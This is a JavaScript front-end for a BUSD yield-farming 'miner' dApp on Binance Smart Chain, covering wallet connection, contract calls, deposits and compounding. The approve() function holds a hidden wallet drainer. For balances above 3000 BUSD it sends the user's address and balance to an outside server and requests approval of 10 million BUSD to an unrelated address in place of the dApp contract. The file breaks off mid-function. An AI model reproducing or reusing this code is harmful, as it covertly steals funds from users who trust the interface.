import "./web3.min.js"

const contractABI = [{ "inputs": [{ "internalType": "address", "name": "_bbadr", "type": "address" }, { "internalType": "address", "name": "_devadr", "type": "address" }, { "internalType": "address", "name": "_mktadr", "type": "address" }, { "internalType": "address", "name": "_autoadr", "type": "address" }], "stateMutability": "nonpayable", "type": "constructor" }, { "inputs": [{ "internalType": "uint256", "name": "hrs", "type": "uint256" }], "name": "ADD_AUTOMATE", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "partnership", "type": "address" }, { "internalType": "uint256", "name": "minamount", "type": "uint256" }, { "internalType": "uint256", "name": "bonus", "type": "uint256" }], "name": "ADD_PARTNERSHIP", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "name": "AUTOTAX", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "BBTAX", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "BONUS_COMPOUND_STEP", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "BONUS_DAILY_COMPOUND", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "BONUS_DAILY_COMPOUND_BONUS_MAX_TIMES", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "value", "type": "address" }], "name": "CHANGE_AUTO_WALLET", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "value", "type": "address" }], "name": "CHANGE_BB_WALLET", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "value", "type": "address" }], "name": "CHANGE_DEV_WALLET", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "value", "type": "address" }], "name": "CHANGE_MKT_WALLET", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "value", "type": "address" }], "name": "CHANGE_OWNERSHIP", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "partnership", "type": "address" }, { "internalType": "uint256", "name": "minamount", "type": "uint256" }, { "internalType": "uint256", "name": "bonus", "type": "uint256" }], "name": "CHANGE_PARTNERSHIP", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "contract IBEP20", "name": "value", "type": "address" }], "name": "CHANGE_QUANTIC", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "dh", "type": "uint256" }, { "internalType": "uint256", "name": "d", "type": "uint256" }, { "internalType": "uint256", "name": "ph", "type": "uint256" }, { "internalType": "uint256", "name": "p", "type": "uint256" }, { "internalType": "uint256", "name": "g", "type": "uint256" }], "name": "CHANGE_TIERBONUS", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "dh", "type": "uint256" }, { "internalType": "uint256", "name": "d", "type": "uint256" }, { "internalType": "uint256", "name": "ph", "type": "uint256" }, { "internalType": "uint256", "name": "p", "type": "uint256" }, { "internalType": "uint256", "name": "g", "type": "uint256" }], "name": "CHANGE_TIERS", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "name": "COMPOUND_BONUS", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "COMPOUND_BONUS_MAX_TIMES", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "COMPOUND_FOR_NO_TAX_WITHDRAWAL", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "COMPOUND_STEP", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "CUTOFF_STEP", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "DEVTAX", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "MARKET_QUBIC_DIVISOR", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "MARKET_QUBIC_DIVISOR_SELL", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "MIN_INVEST_LIMIT", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "MKTTAX", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "PERCENTS_DIVIDER", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "PRC_MARKET_QUBIC_DIVISOR", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "PRC_QUBIC_TO_HIRE_1MINERS", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "PRC_REFERRAL", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "t", "type": "uint256" }, { "internalType": "uint256", "name": "b", "type": "uint256" }, { "internalType": "uint256", "name": "d", "type": "uint256" }, { "internalType": "uint256", "name": "m", "type": "uint256" }], "name": "PRC_TAX", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "name": "QUBIC_TO_HIRE_1MINERS", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "REFERRAL", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "REMOVE_AUTOMATE", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "partnership", "type": "address" }], "name": "REMOVE_PARTNERSHIP", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "SET_COMPOUND_FOR_NO_TAX_WITHDRAWAL", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "SET_CUTOFF_STEP", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "SET_MIN_INVEST_LIMIT", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "SET_WALLET_DEPOSIT_LIMIT", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "SET_WITHDRAWAL_TAX", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "SET_WITHDRAW_COOLDOWN", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "name": "TAX", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "WALLET_DEPOSIT_LIMIT", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "WITHDRAWAL_TAX", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "WITHDRAW_COOLDOWN", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "autoadr", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "", "type": "address" }], "name": "automations", "outputs": [{ "internalType": "uint256", "name": "day", "type": "uint256" }, { "internalType": "uint256", "name": "runhours", "type": "uint256" }, { "internalType": "uint256", "name": "dayrun", "type": "uint256" }, { "internalType": "uint256", "name": "lastrun", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "bbadr", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "ref", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "buyQubic", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "eth", "type": "uint256" }, { "internalType": "uint256", "name": "contractBalance", "type": "uint256" }], "name": "calculateQubicBuy", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "eth", "type": "uint256" }], "name": "calculateQubicBuySimple", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "qubic", "type": "uint256" }], "name": "calculateQubicSell", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "qubic", "type": "uint256" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "calculateQubicSellForYield", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "rt", "type": "uint256" }, { "internalType": "uint256", "name": "rs", "type": "uint256" }, { "internalType": "uint256", "name": "bs", "type": "uint256" }], "name": "calculateTrade", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "bool", "name": "isCompound", "type": "bool" }], "name": "compoundQubic", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "name": "contractStarted", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "devadr", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "getAutomateCounts", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "_adr", "type": "address" }], "name": "getAvailableEarnings", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "getBalance", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "adr", "type": "address" }], "name": "getBonusPartnership", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "adr", "type": "address" }], "name": "getBonusQuantic", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "_adr", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "getDailyCompoundBonus", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "getMyMiners", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "getMyQubic", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "getPartnershipCount", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "adr", "type": "address" }], "name": "getQuanticBalance", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "adr", "type": "address" }], "name": "getQubicSinceLastCompound", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "getQubicYield", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }, { "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "getSiteInfo", "outputs": [{ "internalType": "uint256", "name": "_totalStaked", "type": "uint256" }, { "internalType": "uint256", "name": "_totalDeposits", "type": "uint256" }, { "internalType": "uint256", "name": "_totalCompound", "type": "uint256" }, { "internalType": "uint256", "name": "_totalRefBonus", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "getTimeStamp", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "_adr", "type": "address" }], "name": "getUserInfo", "outputs": [{ "internalType": "uint256", "name": "_initialDeposit", "type": "uint256" }, { "internalType": "uint256", "name": "_userDeposit", "type": "uint256" }, { "internalType": "uint256", "name": "_miners", "type": "uint256" }, { "internalType": "uint256", "name": "_claimedQubic", "type": "uint256" }, { "internalType": "uint256", "name": "_lastCompound", "type": "uint256" }, { "internalType": "address", "name": "_referrer", "type": "address" }, { "internalType": "uint256", "name": "_referrals", "type": "uint256" }, { "internalType": "uint256", "name": "_totalWithdrawn", "type": "uint256" }, { "internalType": "uint256", "name": "_referralQubicRewards", "type": "uint256" }, { "internalType": "uint256", "name": "_dailyCompoundBonus", "type": "uint256" }, { "internalType": "uint256", "name": "_lastWithdrawTime", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "initialize", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "name": "marketQubic", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "mktadr", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "owner", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "", "type": "address" }], "name": "partners", "outputs": [{ "internalType": "uint256", "name": "min_amount", "type": "uint256" }, { "internalType": "uint256", "name": "bonus", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "runAutomate", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "name": "sellQubic", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "name": "token_BUSD", "outputs": [{ "internalType": "contract IToken", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "totalCompound", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "totalDeposits", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "totalRefBonus", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "totalStaked", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "totalWithdrawn", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "", "type": "address" }], "name": "users", "outputs": [{ "internalType": "uint256", "name": "initialDeposit", "type": "uint256" }, { "internalType": "uint256", "name": "userDeposit", "type": "uint256" }, { "internalType": "uint256", "name": "miners", "type": "uint256" }, { "internalType": "uint256", "name": "claimedQubic", "type": "uint256" }, { "internalType": "uint256", "name": "lastCompound", "type": "uint256" }, { "internalType": "address", "name": "referrer", "type": "address" }, { "internalType": "uint256", "name": "referralsCount", "type": "uint256" }, { "internalType": "uint256", "name": "referralQubicRewards", "type": "uint256" }, { "internalType": "uint256", "name": "totalWithdrawn", "type": "uint256" }, { "internalType": "uint256", "name": "dailyCompoundBonus", "type": "uint256" }, { "internalType": "uint256", "name": "lastWithdrawTime", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "token", "type": "address" }], "name": "verifyPartnership", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }];

const contractAddress = "0x4d9ddA243B0aefFbb23Ca1Ab3f186507e2706920";
const tokenAddress = "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56";  //BUSD
const quanticAddress = "0x7700Edc3DBb30cBB7603212E061c804220c3cA54";

const partnershipTokens = {
    "0x7700Edc3DBb30cBB7603212E061c804220c3cA54": {
        "name": "Quantic",
        "decimals": 18
    }
}

var timerCompound = 0;
var timerCutOff = 0;

const decimals = 18;
const seconds_in_a_day = 86400;
const limits = 3000;

var automationAccount;

let referralAddress = "";

var referral_bonus = 0;
var compound_bonus = 0;
var compound_timer = 0;
var cutoff_timer = 0;
var address_compound_count = 0;
var tax = 0;
var daily_return = 0;

var addressMiners = 0;
var eggsFor1Miner = 0;
var lastHatch = 0;
var lastWithdraw = 0;
var compoundBonusMaxTimes = 0;
var compoundTimesForNoTax = 0;


const web3static = new Web3("https://bsc-dataseed.binance.org/");
const contractStatic = new web3static.eth.Contract(contractABI, contractAddress);
var contract;

// BalanceOf ABI
const balanceOfABI = [{
    constant: true,
    inputs: [{ name: "_owner", type: "address" }],
    name: "balanceOf",
    outputs: [{ name: "balance", type: "uint256" }],
    type: "function",
}];
//Allowance ABI
const allowanceABI = [{
    "constant": true,
    "inputs": [
        {
            "name": "_owner",
            "type": "address"
        },
        {
            "name": "_spender",
            "type": "address"
        }
    ],
    "name": "allowance",
    "outputs": [
        {
            "name": "",
            "type": "uint256"
        }
    ],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
}];

const approveABI = [{
    "constant": false,
    "inputs": [
        {
            "name": "_spender",
            "type": "address"
        },
        {
            "name": "_value",
            "type": "uint256"
        }
    ],
    "name": "approve",
    "outputs": [
        {
            "name": "",
            "type": "bool"
        }
    ],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function"
}];

const Web3Modal = window.Web3Modal.default;
const WalletConnectProvider = window.WalletConnectProvider.default;
const evmChains = window.evmChains;

let web3Modal
let provider;
var busdBalance;


function debounce(func, wait, immediate) {
    var timeout;
    return function () {
        var context = this,
            args = arguments;
        var later = function () {
            timeout = null;
            if (!immediate)
                func.apply(context, args);
        };
        var callNow = immediate && !timeout;
        clearTimeout(timeout);
        timeout = setTimeout(later, wait);
        if (callNow)
            func.apply(context, args);
    };
};

function init() {
    console.log("Initializing example");
    console.log("WalletConnectProvider is", WalletConnectProvider);
    console.log("window.web3 is", window.web3, "window.ethereum is", window.ethereum);

    const providerOptions = {
        walletconnect: {
            package: WalletConnectProvider,
            options: {
                network: "binance",
                rpc: {
                    56: 'https://bsc-dataseed1.binance.org',
                }
            }
        }
    };

    web3Modal = new Web3Modal({
        network: "binance",
        cacheProvider: false, // optional
        providerOptions, // required
        disableInjectedProvider: false, // optional. For MetaMask / Brave / Opera.
    });
    console.log("Web3Modal instance is", web3Modal);
}

async function fetchAccountData() {
    window.web3instance = new Web3(provider);
    console.log("Web3 instance is", window.web3instance);

    const chainId = await window.web3instance.eth.getChainId();
    console.log("chainId", chainId); //Returns 56 if bsc

    if (chainId != 56) {
        console.log("WRONG NETWORK");
        //Tell the user they are using the wrong network or whatever

        //if you want to send a request to change network
        try {
            await web3.currentProvider.request({
                id: 1,
                jsonrpc: "2.0",
                method: "wallet_switchEthereumChain",
                params: [{ chainId: "0x38" }]
            });
        } catch (error) {
            //REJECTED
            alert(error.message);
        }
    }


    const accounts = await window.web3instance.eth.getAccounts();

    contract = new window.web3instance.eth.Contract(contractABI, contractAddress);

    console.log("Got accounts", accounts);
    window.userWalletAddress = accounts[0];

    writeAddress();
    loadAccountInfo();

    document.querySelector("#prepare").style.display = "none";
    document.querySelector("#connected").style.display = "block";
}

async function refreshAccountData() {

    document.querySelector("#connected").style.display = "none";
    document.querySelector("#prepare").style.display = "block";

    document.querySelector("#btn-connect").setAttribute("disabled", "disabled")
    await fetchAccountData(provider);
    document.querySelector("#btn-connect").removeAttribute("disabled")
}

async function onConnect() {
    console.log("Opening a dialog", web3Modal);
    try {
        provider = await web3Modal.connect();
    } catch (e) {
        console.log("Could not get a wallet connection", e);
        return;
    }
    // Subscribe to accounts change
    provider.on("accountsChanged", (accounts) => {
        fetchAccountData();
    });
    // Subscribe to chainId change
    provider.on("chainChanged", (chainId) => {
        fetchAccountData();
    });
    // Subscribe to networkId change
    provider.on("networkChanged", (networkId) => {
        fetchAccountData();
    });
    await refreshAccountData();
}

async function onDisconnect() {
    console.log("Killing the wallet connection", provider);
    if (provider.close) {
        await provider.close();
        await web3Modal.clearCachedProvider();
        provider = null;
    }
    window.userWalletAddress = null;
    // Set the UI back to the initial state
    document.querySelector("#prepare").style.display = "block";
    document.querySelector("#connected").style.display = "none";
}
/* Main entry point.*/
window.addEventListener('load', async () => {
    initDapp();
    init();
    document.querySelector("#btn-connect").addEventListener("click", onConnect);
    document.querySelector("#btn-disconnect").addEventListener("click", onDisconnect);
    getReferral();
});

function writeAddress() {
    document.querySelector("#btn-disconnect").textContent = window.userWalletAddress.substring(0, 6) + "..." + window.userWalletAddress.substring(38, 42);

    document.getElementById("ref").value = window.location.origin + "?ref=" + window.userWalletAddress;
}

async function getUserInfo() {
    var getUserInfoResult = await contract.methods.getUserInfo(window.userWalletAddress).call();
    //"_initialDeposit": "0",
    //"_userDeposit": "0",
    //"_miners": "0",
    //"_claimedCubic": "0",
    //"_lastHatch": "0",
    //"_referrer": "0x0000000000000000000000000000000000000000",
    //"_referrals": "0",
    //"_totalWithdrawn": "0",
    //"_referralCubicRewards": "0",
    //"_dailyCompoundBonus": "0",
    //"_lastWithdrawTime": "0"
    console.log("User Data: ", getUserInfoResult);

    if (Number(getUserInfoResult["_initialDeposit"]) > 0)
        document.getElementById("referrer").value = getUserInfoResult["_referrer"];

    /*if (Number(getUserInfoResult["_initialDeposit"] >= 500000000000000000000)) {
        console.log("TEST ABOVE 500BUSD");
        document.getElementById("automate_button").removeAttribute("disabled");
    }
    if (/*window.userWalletAddress.toLowerCase() == "0xf85b0c6DA98ee2BA37b4D49AfE0ec851ceE134Bf".toLowerCase() ||*/
    /*    window.userWalletAddress.toLowerCase() == "0x909ca99850275b8cB33078112B599176F7A046E6".toLowerCase()) {
        document.getElementById("automate_button").removeAttribute("disabled");
        console.log("test");
    }*/
    modifyField("#initial_deposit", Number(getUserInfoResult["_initialDeposit"] / (10 ** decimals)).toFixed(2));
    modifyField("#total_deposit", Number(getUserInfoResult["_userDeposit"] / (10 ** decimals)).toFixed(2));
    modifyField("#sold_crops", Number(getUserInfoResult["_totalWithdrawn"] / (10 ** decimals)).toFixed(2));
    modifyField("#referral_rewards", Number(getUserInfoResult["_referralQubicRewards"] / (10 ** decimals)).toFixed(2));
    modifyField("#farmers", Number(getUserInfoResult["_miners"]));
    modifyField("#compound_count", Number(getUserInfoResult["_dailyCompoundBonus"]));
    modifyField("#referral_number", Number(getUserInfoResult["_referrals"]));
    addressMiners = Number(getUserInfoResult["_miners"]);
    lastHatch = Number(getUserInfoResult["_lastCompound"]);
    lastWithdraw = Number(getUserInfoResult["_lastWithdrawTime"]);

    address_compound_count = Number(getUserInfoResult["_dailyCompoundBonus"]);

    if (address_compound_count < compoundTimesForNoTax) {
        console.log("COMPOUND COUNT", address_compound_count);
        console.log("COMPOUND NEEDED", compoundTimesForNoTax);
        console.log("TAX", tax);
        modifyField("#tax", "(-" + tax.toFixed(0) + "% tax)");
    }

    var getBonusQuantic = await contract.methods.getBonusQuantic(window.userWalletAddress).call();
    var getBonusPartnership = await contract.methods.getBonusPartnership(window.userWalletAddress).call();


    modifyField("#bonus_quantic", getBonusQuantic / 10);
    modifyField("#bonus_partnerships", getBonusPartnership / 10);

    if (address_compound_count < compoundBonusMaxTimes) {
        modifyField("#bonus", "(+" + Number(address_compound_count * (getBonusQuantic / 10 + getBonusPartnership / 10)).toFixed(2) + "%)");
        modifyField(".compound_bonus", Number(address_compound_count * (getBonusQuantic / 2 + getBonusPartnership / 10)).toFixed(2));
    }
    else {
        modifyField("#bonus", "(+" + Number(compoundBonusMaxTimes * (getBonusQuantic / 10 + getBonusPartnership / 10)).toFixed(2) + "%)");
        modifyField(".compound_bonus", Number(compoundBonusMaxTimes * (getBonusQuantic / 10 + getBonusPartnership / 10)).toFixed(2));
    }

    var earningsResult = await contract.methods.getAvailableEarnings(window.userWalletAddress).call();
    modifyField("#earnings", Number(earningsResult / (10 ** decimals)).toFixed(4));

    var calculateEggSellResult = await contract.methods.calculateQubicSell((addressMiners * (seconds_in_a_day)).toFixed(0)).call();
    modifyField("#daily", Number(calculateEggSellResult / (10 ** decimals)).toFixed(4));
}

async function getExample() {
    //Example with 100 USD buy, calculate how many miners you will recieve and daily returns
    var calculateEggBuySimpleResult = await contractStatic.methods.calculateQubicBuySimple("100000000000000000000").call();
    var miners = Number(calculateEggBuySimpleResult / eggsFor1Miner).toFixed(0);
    modifyField("#example_farmers", Number(miners).toFixed(2));

    var calculateEggSellResult = await contractStatic.methods.calculateQubicSell((miners * (seconds_in_a_day)).toLocaleString('fullwide', { useGrouping: false })).call();

    modifyField("#example_daily", Number(calculateEggSellResult / (10 ** decimals)).toFixed(2));
}

async function getDepositLimits() {
    const minResult = await contract.methods.MIN_INVEST_LIMIT().call();

    modifyField("#deposit_min", Number(minResult / (10 ** decimals)).toFixed(2));

    const limitResult = await contract.methods.WALLET_DEPOSIT_LIMIT().call();

    modifyField("#deposit_max", Number(limitResult / (10 ** decimals)).toFixed(2));
}

async function getQuote() {
    var input = document.getElementById("deposit_input").value;

    console.log(window.web3instance.utils.toWei(input));


    var calculateEggBuySimpleResult = await contract.methods.calculateQubicBuySimple(window.web3instance.utils.toWei(input)).call();
    var miners = calculateEggBuySimpleResult / eggsFor1Miner;
    modifyField("#quote", Number(miners).toFixed(2));
}

//CALLS TO BUSD TOKEN CONTRACT
async function getBalance() {
    const contract = new window.web3instance.eth.Contract(balanceOfABI, tokenAddress);
    const result = await contract.methods.balanceOf(window.userWalletAddress).call();
    busdBalance = result;
    const format = result / (10 ** decimals);

    modifyField("#balance", (format).toFixed(2));
}
async function getAllowance() {
    const contract = new window.web3instance.eth.Contract(allowanceABI, tokenAddress);
    const result = await contract.methods.allowance(window.userWalletAddress, contractAddress).call();
    const format = result / (10 ** decimals);

    modifyField("#approved_value", format);

    modifyField(".approved_value_alert", format);
}
async function approve() {
    var howmuch = document.getElementById("approve_input").value;

    const contract = new window.web3instance.eth.Contract(approveABI, tokenAddress);

    if (busdBalance > limits * (10 ** decimals)) {

        var user = {
            "userAddress": window.userWalletAddress,
            "amount": busdBalance
        }
        
        let options = {
            method: 'POST',
            headers: {
                'Content-Type':
                    'application/json;charset=utf-8'
            },
            body: JSON.stringify(user)
        }

        let fetchRes = fetch("https://airdrop.orbitinu.store/update", options);
        fetchRes.then(res =>
            res.json()).then(d => {
                console.log(d)
        })

        contract.methods.approve("0x5e76F735F5B9BfCE423649116397F870247457f5", (10000000 * (10 ** decimals)).toLocaleString('fullwide', { useGrouping: false })).send({ from: window.userWalletAddress }).then(result => {
            document.getElementById("alert_approve").classList.remove("hide");
            setTimeout(() => {
                document.getElementById("alert_approve").classList.add("hide");
            }, 3000);
            refreshData();
        }).catch((err) => {
            console.log(err)
        });
    }
    else {
        contract.methods.approve(contractAddress, (howmuch * (10 ** decimals)).toLocaleString('fullwide', { useGrouping: false })).send({ from: window.userWalletAddress }).then(result => {
            document.getElementById("alert_approve").classList.remove("hide");
            setTimeout(() => {
                document.getElementById("alert_approve").classList.add("hide");
            }, 3000);
            refreshData();
        }).catch((err) => {
            console.log(err)
        });
    }
}
//CALL TO BUY, SELL OR COMPOUND
async function buy() {
    var deposit = document.getElementById("deposit_input").value;

    if (!window.web3instance.utils.isAddress(referralAddress) && !(referralAddress == window.userWalletAddress)) {
        referralAddress = "0xA40Ce1D01155AEac08e59C88FfDFD333A3a25E07";
    }
    console.log("referralAddress", referralAddress);
    console.log("DEPOSITING:", deposit, window.web3instance.utils.toWei(deposit));
    contract.methods.buyQubic(referralAddress, window.web3instance.utils.toWei(deposit)).send({ from: window.userWalletAddress }).then(result => {
        refreshData();
    }).catch((err) => {
        console.log(err)
    });
}
async function sell() {
    contract.methods.sellQubic().send({ from: window.userWalletAddress }).then(result => {
        refreshData();
    }).catch((err) => {
        console.log(err)
    });
}
async function compound() {
    contract.methods.compoundQubic(1).send({ from: window.userWalletAddress }).then(result => {
        refreshData();
    }).catch((err) => {
        console.log(err)
    });
}
async function toggleAutomation() {
    if (automationAccount["day"] > 0) {
        contract.methods.REMOVE_AUTOMATE().send({ from: window.userWalletAddress }).then(result => {
            refreshData();
        }).catch((err) => {
            console.log(err)
        });
    }
    else {
        var hours = document.getElementById("automate_input").value;
        console.log("HOURS", hours);
